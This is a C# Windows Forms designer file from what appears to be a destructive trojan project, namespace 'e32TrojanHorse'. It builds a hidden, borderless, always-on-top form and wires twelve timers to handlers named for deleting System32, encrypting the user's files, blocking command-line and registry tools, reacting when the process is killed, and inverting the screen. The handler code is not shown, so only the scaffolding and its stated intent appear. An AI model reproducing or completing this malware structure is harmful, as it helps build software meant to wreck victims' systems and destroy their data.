namespace e32TrojanHorse
{
    partial class GDIPayloads
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.Tunnel = new System.Windows.Forms.Timer(this.components);
            this.DrawIcons = new System.Windows.Forms.Timer(this.components);
            this.BlockCmdRegister = new System.Windows.Forms.Timer(this.components);
            this.Sounds = new System.Windows.Forms.Timer(this.components);
            this.IFUKILLPROCESS = new System.Windows.Forms.Timer(this.components);
            this.STARTDELETESYSTEM32 = new System.Windows.Forms.Timer(this.components);
            this.SCREENTICK = new System.Windows.Forms.Timer(this.components);
            this.STDEL = new System.Windows.Forms.Timer(this.components);
            this.ERRORS = new System.Windows.Forms.Timer(this.components);
            this.EncFilesFromPC = new System.Windows.Forms.Timer(this.components);
            this.MoveCursor = new System.Windows.Forms.Timer(this.components);
            this.InvertScreen = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // Tunnel
            // 
            this.Tunnel.Interval = 300;
            this.Tunnel.Tick += new System.EventHandler(this.Tunnel_Tick);
            // 
            // DrawIcons
            // 
            this.DrawIcons.Interval = 1;
            this.DrawIcons.Tick += new System.EventHandler(this.DrawIcons_Tick);
            // 
            // BlockCmdRegister
            // 
            this.BlockCmdRegister.Tick += new System.EventHandler(this.BlockCmdRegister_Tick);
            // 
            // Sounds
            // 
            this.Sounds.Tick += new System.EventHandler(this.Sounds_Tick);
            // 
            // IFUKILLPROCESS
            // 
            this.IFUKILLPROCESS.Interval = 1;
            this.IFUKILLPROCESS.Tick += new System.EventHandler(this.IFUKILLPROCESS_Tick);
            // 
            // STARTDELETESYSTEM32
            // 
            this.STARTDELETESYSTEM32.Interval = 67777;
            this.STARTDELETESYSTEM32.Tick += new System.EventHandler(this.STARTDELETESYSTEM32_Tick);
            // 
            // SCREENTICK
            // 
            this.SCREENTICK.Interval = 240;
            this.SCREENTICK.Tick += new System.EventHandler(this.SCREENTICK_Tick);
            // 
            // STDEL
            // 
            this.STDEL.Interval = 1;
            this.STDEL.Tick += new System.EventHandler(this.STDEL_Tick);
            // 
            // ERRORS
            // 
            this.ERRORS.Interval = 1;
            this.ERRORS.Tick += new System.EventHandler(this.ERRORS_Tick);
            // 
            // EncFilesFromPC
            // 
            this.EncFilesFromPC.Interval = 1;
            this.EncFilesFromPC.Tick += new System.EventHandler(this.EncFilesFromPC_Tick);
            // 
            // MoveCursor
            // 
            this.MoveCursor.Tick += new System.EventHandler(this.MoveCursor_Tick);
            // 
            // InvertScreen
            // 
            this.InvertScreen.Tick += new System.EventHandler(this.InvertScreen_Tick);
            // 
            // GDIPayloads
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.ClientSize = new System.Drawing.Size(10, 10);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "GDIPayloads";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "GDIPayloads";
            this.TopMost = true;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.GDIPayloads_FormClosing);
            this.Load += new System.EventHandler(this.GDIPayloads_Load);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer Tunnel;
        private System.Windows.Forms.Timer DrawIcons;
        private System.Windows.Forms.Timer BlockCmdRegister;
        private System.Windows.Forms.Timer Sounds;
        private System.Windows.Forms.Timer IFUKILLPROCESS;
        private System.Windows.Forms.Timer STARTDELETESYSTEM32;
        private System.Windows.Forms.Timer SCREENTICK;
        private System.Windows.Forms.Timer STDEL;
        private System.Windows.Forms.Timer ERRORS;
        private System.Windows.Forms.Timer EncFilesFromPC;
        private System.Windows.Forms.Timer MoveCursor;
        private System.Windows.Forms.Timer InvertScreen;
    }
}